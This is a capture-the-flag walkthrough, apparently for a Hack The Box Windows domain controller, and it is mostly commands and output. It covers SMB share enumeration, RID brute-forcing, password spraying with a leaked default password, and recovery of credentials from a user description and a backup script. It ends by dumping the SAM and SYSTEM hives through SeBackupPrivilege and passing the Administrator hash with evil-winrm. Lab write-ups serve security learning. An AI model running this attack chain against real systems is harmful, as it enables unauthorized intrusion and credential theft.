Let's start with NMAP :

```
nmap -sC -sV -vv 10.10.11.35 -Pn

Initiating NSE at 17:59
Completed NSE at 17:59, 0.00s elapsed
Nmap scan report for 10.10.11.35 (10.10.11.35)
Host is up, received user-set (0.050s latency).
Scanned at 2025-02-10 17:57:45 CET for 97s
Not shown: 989 filtered tcp ports (no-response)
PORT     STATE SERVICE       REASON  VERSION
53/tcp   open  domain        syn-ack Simple DNS Plus
88/tcp   open  kerberos-sec  syn-ack Microsoft Windows Kerberos (server time: 2025-02-10 23:57:57Z)
135/tcp  open  msrpc         syn-ack Microsoft Windows RPC
139/tcp  open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn
389/tcp  open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds? syn-ack
464/tcp  open  kpasswd5?     syn-ack
593/tcp  open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      syn-ack Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
3268/tcp open  ldap          syn-ack Microsoft Windows Active
3269/tcp open  ssl/ldap      syn-ack Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
Host script results:
| smb2-time: 
|   date: 2025-02-10T23:58:39
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 43674/tcp): CLEAN (Timeout)
|   Check 2 (port 22100/tcp): CLEAN (Timeout)
|   Check 3 (port 62917/udp): CLEAN (Timeout)
|   Check 4 (port 18783/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
|_clock-skew: 6h59m59s
```

We can see we have an LDAP and a SMB service opened, let's start enumerating samba shares:

```
smbclient -L \\10.10.11.35 -N

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	DEV             Disk      
	HR              Disk      
	IPC$            IPC       Remote IPC
	NETLOGON        Disk      Logon server share 
	SYSVOL          Disk      Logon server share 
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.11.35 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available

```

We got some interesting shares "DEV" and "HR". Let's try to read them without a password and we discover that only "HR" is readable.
In HR share we find a file called "Notice from HR.txt", so we download it to our machine:

```
smbclient //10.10.11.35/HR -N
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Thu Mar 14 13:29:09 2024
  ..                                  D        0  Thu Mar 14 13:21:29 2024
  Notice from HR.txt                  A     1266  Wed Aug 28 19:31:48 2024

		4168447 blocks of size 4096. 417502 blocks available
smb: \> get "Notice from HR.txt" /home/francesco/Downloads/Notice_from_HR.txt
getting file \Notice from HR.txt of size 1266 as /home/francesco/Downloads/Notice_from_HR.txt (7,4 KiloBytes/sec) (average 7,4 KiloBytes/sec)

```

Once we open it, we find a default password assigned to each new hire:

```
Dear new hire!

Welcome to Cicada Corp! We're thrilled to have you join our team. As part of our security protocols, it's essential that you change your default password to something unique and secure.

Your default password is: ****************
...
```

To find users who use this password, we need to know a list of users on the domain.
In order to do so, we can brute force the user RID of each user using crackmapexec:

```
crackmapexec smb 10.10.11.35 --rid-brute -u 'guest' -p ''
SMB         10.10.11.35     445    CICADA-DC        [*] Windows 10.0 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.35     445    CICADA-DC        [+] cicada.htb\guest: 
SMB         10.10.11.35     445    CICADA-DC        498: CICADA\Enterprise Read-only Domain Controllers (SidTypeGroup)
SMB         10.10.11.35     445    CICADA-DC        500: CICADA\Administrator (SidTypeUser)
SMB         10.10.11.35     445    CICADA-DC        501: CICADA\Guest (SidTypeUser)
SMB         10.10.11.35     445    CICADA-DC        502: CICADA\krbtgt (SidTypeUser)
SMB         10.10.11.35     445    CICADA-DC        512: CICADA\Domain Admins (SidTypeGroup)
SMB         10.10.11.35     445    CICADA-DC        513: CICADA\Domain Users (SidTypeGroup)
SMB         10.10.11.35     445    CICADA-DC        514: CICADA\Domain Guests (SidTypeGroup)
SMB         10.10.11.35     445    CICADA-DC        515: CICADA\Domain Computers (SidTypeGroup)
SMB         10.10.11.35     445    CICADA-DC        516: CICADA\Domain Controllers (SidTypeGroup)
SMB         10.10.11.35     445    CICADA-DC        517: CICADA\Cert Publishers (SidTypeAlias)
SMB         10.10.11.35     445    CICADA-DC        518: CICADA\Schema Admins (SidTypeGroup)
SMB         10.10.11.35     445    CICADA-DC        519: CICADA\Enterprise Admins (SidTypeGroup)
SMB         10.10.11.35     445    CICADA-DC        520: CICADA\Group Policy Creator Owners (SidTypeGroup)
SMB         10.10.11.35     445    CICADA-DC        521: CICADA\Read-only Domain Controllers (SidTypeGroup)
SMB         10.10.11.35     445    CICADA-DC        522: CICADA\Cloneable Domain Controllers (SidTypeGroup)
SMB         10.10.11.35     445    CICADA-DC        525: CICADA\Protected Users (SidTypeGroup)
SMB         10.10.11.35     445    CICADA-DC        526: CICADA\Key Admins (SidTypeGroup)
SMB         10.10.11.35     445    CICADA-DC        527: CICADA\Enterprise Key Admins (SidTypeGroup)
SMB         10.10.11.35     445    CICADA-DC        553: CICADA\RAS and IAS Servers (SidTypeAlias)
SMB         10.10.11.35     445    CICADA-DC        571: CICADA\Allowed RODC Password Replication Group (SidTypeAlias)
SMB         10.10.11.35     445    CICADA-DC        572: CICADA\Denied RODC Password Replication Group (SidTypeAlias)
SMB         10.10.11.35     445    CICADA-DC        1000: CICADA\CICADA-DC$ (SidTypeUser)
SMB         10.10.11.35     445    CICADA-DC        1101: CICADA\DnsAdmins (SidTypeAlias)
SMB         10.10.11.35     445    CICADA-DC        1102: CICADA\DnsUpdateProxy (SidTypeGroup)
SMB         10.10.11.35     445    CICADA-DC        1103: CICADA\Groups (SidTypeGroup)
SMB         10.10.11.35     445    CICADA-DC        1104: CICADA\john.smoulder (SidTypeUser)
SMB         10.10.11.35     445    CICADA-DC        1105: CICADA\sarah.dantelia (SidTypeUser)
SMB         10.10.11.35     445    CICADA-DC        1106: CICADA\michael.wrightson (SidTypeUser)
SMB         10.10.11.35     445    CICADA-DC        1108: CICADA\david.orelious (SidTypeUser)
SMB         10.10.11.35     445    CICADA-DC        1109: CICADA\Dev Support (SidTypeGroup)
SMB         10.10.11.35     445    CICADA-DC        1601: CICADA\emily.oscars (SidTypeUser)
```

As we can see, we find those users:
```
john.smoulder
sarah.dantelia
michael.wrightson
david.orelious
emily.oscars
```

Now we can try the password we found before and see if we get any matches passing a file with all the users above.

```

crackmapexec smb 10.10.11.35 -u /home/francesco/Documents/cicada/users.txt -p '***********' --continue-on-success
SMB         10.10.11.35     445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.35     445    CICADA-DC        [-] cicada.htb\john.smoulder:*********** STATUS_LOGON_FAILURE 
SMB         10.10.11.35     445    CICADA-DC        [-] cicada.htb\sarah.dantelia:*********** STATUS_LOGON_FAILURE 
SMB         10.10.11.35     445    CICADA-DC        [+] cicada.htb\michael.wrightson:*********** 
SMB         10.10.11.35     445    CICADA-DC        [-] cicada.htb\david.orelious:*********** STATUS_LOGON_FAILURE 
SMB         10.10.11.35     445    CICADA-DC        [-] cicada.htb\emily.oscars:*********** STATUS_LOGON_FAILURE 
```

We found out that micheal.wrightson match the password we got before. 
At this point we tried to re-run crackmapexec enumerating users using micheal creds:

```
crackmapexec smb 10.10.11.35 -u 'michael.wrightson' -p '***********' --users
SMB         10.10.11.35     445    CICADA-DC        [*] Windows 10.0 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.35     445    CICADA-DC        [+] cicada.htb\michael.wrightson:***********
SMB         10.10.11.35     445    CICADA-DC        [*] Trying to dump local users with SAMRPC protocol
SMB         10.10.11.35     445    CICADA-DC        [+] Enumerated domain user(s)
SMB         10.10.11.35     445    CICADA-DC        cicada.htb\Administrator                  Built-in account for administering the computer/domain
SMB         10.10.11.35     445    CICADA-DC        cicada.htb\Guest                          Built-in account for guest access to the computer/domain
SMB         10.10.11.35     445    CICADA-DC        cicada.htb\krbtgt                         Key Distribution Center Service Account
SMB         10.10.11.35     445    CICADA-DC        cicada.htb\john.smoulder    
SMB         10.10.11.35     445    CICADA-DC        cicada.htb\sarah.dantelia   
SMB         10.10.11.35     445    CICADA-DC        cicada.htb\michael.wrightson
SMB         10.10.11.35     445    CICADA-DC        cicada.htb\david.orelious                 Just in case I forget my password is ***********
SMB         10.10.11.35     445    CICADA-DC        cicada.htb\emily.oscars 
```

We see a juicy info for david.orelious, in his note we find his password.
Even using his creds, we didn't find more info enumerating users, so we tried to access smb shares to see if he has more priv. than micheal.

In fact we got access to "DEV" share:

```
smbclient //10.10.11.35/DEV -U 'david.orelious%aRt$Lp#*******' 
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Thu Mar 14 13:31:39 2024
  ..                                  D        0  Thu Mar 14 13:21:29 2024
  Backup_script.ps1                   A      601  Wed Aug 28 19:28:22 2024
```

Once downloaded, in this script we find emily.oscars credentials in plaintext:

```
$sourceDirectory = "C:\smb"
$destinationDirectory = "D:\Backup"

$username = "emily.oscars"
$password = ConvertTo-SecureString "*******" -AsPlainText -Force
$credentials = New-Object System.Management.Automation.PSCredential($username, $password)
$dateStamp = Get-Date -Format "yyyyMMdd_HHmmss"
$backupFileName = "smb_backup_$dateStamp.zip"
$backupFilePath = Join-Path -Path $destinationDirectory -ChildPath $backupFileName
Compress-Archive -Path $sourceDirectory -DestinationPath $backupFilePath
Write-Host "Backup completed successfully. Backup file saved to: $backupFilePath"
```

It turns out that, we can access to C$ share with her creds, so we also tried connect with a remote shell using evil-winRM and boom we got the user! :

```
┌─[francesco@parrot]─[~]
└──╼ $evil-winrm -i 10.10.11.35 -u 'emily.oscars' -p 'Q!3@Lp#M6*******'
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Documents> cd ../Desktop
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Desktop> ls


    Directory: C:\Users\emily.oscars.CICADA\Desktop


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-ar---         2/13/2025   3:02 AM             34 user.txt
```

Exploring the filesystem, we don't find anything useful so we try to understand which privileges emily has:

```
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Desktop> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeBackupPrivilege             Back up files and directories  Enabled
SeRestorePrivilege            Restore files and directories  Enabled
SeShutdownPrivilege           Shut down the system           Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```

We notice she has SeBackupPrivilege, you can google it and deeply understand what is used for, but essentially it enables the user to create backups of the filesystem.
To make it possibile, the user has the read permission of all the file system, including critical files such as SAM and SYSTEM.

Let's use it for our advantage, let's create a C:\Temp folder in which we have write permission and let's copy SAM and SYSTEM files:

```
*Evil-WinRM* PS C:\Temp> reg save hklm\sam C:\Temp\sam
The operation completed successfully.

*Evil-WinRM* PS C:\Temp> reg save hklm\system C:\Temp\system
The operation completed successfully.
```

Then we download it to our local machine using "download" command.

Once on our local machine, we can parse the content using pypykatz:
```
pypykatz registry --sam sam system 
WARNING:pypykatz:SECURITY hive path not supplied! Parsing SECURITY will not work
WARNING:pypykatz:SOFTWARE hive path not supplied! Parsing SOFTWARE will not work
============== SYSTEM hive secrets ==============
CurrentControlSet: ControlSet001
Boot Key: 3c2b033757a49110a9ee680b46e8d620
============== SAM hive secrets ==============
HBoot Key: a1c299e572ff8c643a857d3fdb3e5c7c10101010101010101010101010101010
Administrator:500:aad3b435b51404eeaad3b435b51404ee:2b87e7c93a3e8a0ea4a*************:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
```

We can see the usual format "User:RID:LMHASH:NTLMHASH". In this case the LMHASH is a the hash of blank password. It means that LM hash is not used.
Instead, we can see NTLMHASH of the Administrator user. This can be used to access to the machine using evil-winRM:

```
┌─[francesco@parrot]─[~]
└──╼ $evil-winrm -i 10.10.11.35 -u Administrator -H "2b87e7c93a3e8a0ea4a*************"
                                        
Evil-WinRM shell v3.5
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ../Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> ls


    Directory: C:\Users\Administrator\Desktop


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-ar---         2/13/2025   3:02 AM             34 root.txt
```

And we are root!!!



